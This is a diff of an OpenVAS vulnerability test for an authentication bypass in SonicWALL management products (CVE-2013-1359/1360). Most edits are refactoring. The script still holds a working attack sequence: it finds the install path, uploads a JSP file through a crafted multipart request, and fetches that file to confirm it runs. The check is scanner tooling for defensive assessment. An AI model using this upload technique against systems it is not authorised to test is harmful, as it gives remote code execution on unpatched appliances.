@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_SonicWALL_rce_01_13.nasl 5842 2017-04-03 13:15:19Z cfi $
+# $Id: gb_SonicWALL_rce_01_13.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # Multiple SonicWALL Products Authentication Bypass Vulnerability
 #
@@ -25,7 +25,34 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Multiple SonicWALL products including Global Management System (GMS),
+if(description)
+{
+  script_oid("1.3.6.1.4.1.25623.1.0.103642");
+  script_tag(name:"cvss_base", value:"10.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
+  script_bugtraq_id(57445);
+  script_cve_id("CVE-2013-1359", "CVE-2013-1360");
+  script_version("$Revision: 11497 $");
+
+  script_name("Multiple SonicWALL Products Authentication Bypass Vulnerability");
+
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57445");
+  script_xref(name:"URL", value:"http://www.sonicwall.com/");
+  script_xref(name:"URL", value:"http://sotiriu.de/adv/NSOADV-2013-001.txt");
+
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2013-01-18 13:01:11 +0100 (Fri, 18 Jan 2013)");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for more
+information.");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"summary", value:"Multiple SonicWALL products including Global Management System (GMS),
 ViewPoint, Universal Management Appliance (UMA), and Analyzer are
 prone to an authentication-bypass vulnerability.
 
@@ -36,43 +63,14 @@ SYSTEM privileges that could fully compromise the system.
 The following versions are affected:
 
 GMS/Analyzer/UMA 7.0.x GMS/ViewPoint/UMA 6.0.x GMS/ViewPoint/UMA 5.1.x
-GMS/ViewPoint 5.0.x GMS/ViewPoint 4.1.x";
+GMS/ViewPoint 5.0.x GMS/ViewPoint 4.1.x");
 
-
-tag_solution = "Vendor updates are available. Please see the references for more
-information.";
-
-if (description)
-{
- script_oid("1.3.6.1.4.1.25623.1.0.103642");
- script_tag(name:"cvss_base", value:"10.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
- script_bugtraq_id(57445);
- script_cve_id("CVE-2013-1359","CVE-2013-1360");
- script_version ("$Revision: 5842 $");
-
- script_name("Multiple SonicWALL Products Authentication Bypass Vulnerability");
-
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57445");
- script_xref(name : "URL" , value : "http://www.sonicwall.com/");
- script_xref(name : "URL" , value : "http://sotiriu.de/adv/NSOADV-2013-001.txt");
-
- script_tag(name:"last_modification", value:"$Date: 2017-04-03 15:15:19 +0200 (Mon, 03 Apr 2017) $");
- script_tag(name:"creation_date", value:"2013-01-18 13:01:11 +0100 (Fri, 18 Jan 2013)");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 
@@ -81,6 +79,8 @@ buf = http_get_cache(item:url, port:port);
 
 if("<title>sonicwall" >!< tolower(buf))exit(0);
 
+useragent = get_http_user_agent();
+vtstring = get_vt_string( lowercase:TRUE );
 host = http_host_name(port:port);
 
 req = string(
@@ -88,7 +88,7 @@ req = string(
 "TE: deflate,gzip;q=0.3\r\n",
 "Connection: TE, close\r\n",
 "Host: ",host,"\r\n",
-"User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+"User-Agent: ", useragent, "\r\n",
 "Content-Length: 90\r\n",
 "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n",
 "\r\n",
@@ -107,7 +107,7 @@ foreach line (lines) {
       b = split(a[1],sep:"logs",keep:FALSE);
       gms_path = b[0];
       if(!isnull(gms_path))break;
-    }  
+    }
   }
 }
 
@@ -115,14 +115,14 @@ if(isnull(gms_path))exit(0);
 
 if(gms_path =~ "^/") {
   gms_path = gms_path + "webapps/appliance/";
-}  
+}
 else {
   gms_path = gms_path + 'webapps\\appliance\\';
-}  
+}
 
-file = 'openvas_' + rand() +  '.jsp';
+file = vtstring + '_' + rand() +  '.jsp';
 
-jsp_print = 'openvas_' + rand();;
+jsp_print = vtstring + '_' + rand();;
 jsp = '<% out.println( "' + jsp_print  + '" ); %>';
 
 len = 325 + strlen(jsp) + strlen(gms_path) + strlen(file);
@@ -132,7 +132,7 @@ req = string(
 "TE: deflate,gzip;q=0.3\r\n",
 "Connection: TE, close\r\n",
 "Host: ",host,"\r\n",
-"User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+"User-Agent: ", useragent, "\r\n",
 "Content-Length: ",len,"\r\n",
 "Content-Type: multipart/form-data; boundary=xYzZY\r\n",
 "\r\n",
@@ -155,7 +155,7 @@ gms_path,"\r\n",
 jsp,"\r\n",
 
 "\r\n",
-"--xYzZY--\r\n"); 
+"--xYzZY--\r\n");
 
 result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
@@ -166,10 +166,8 @@ req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
 if(jsp_print >< buf) {
-
   security_message(port:port);
   exit(0);
-
-}  
+}
 
 exit(99);
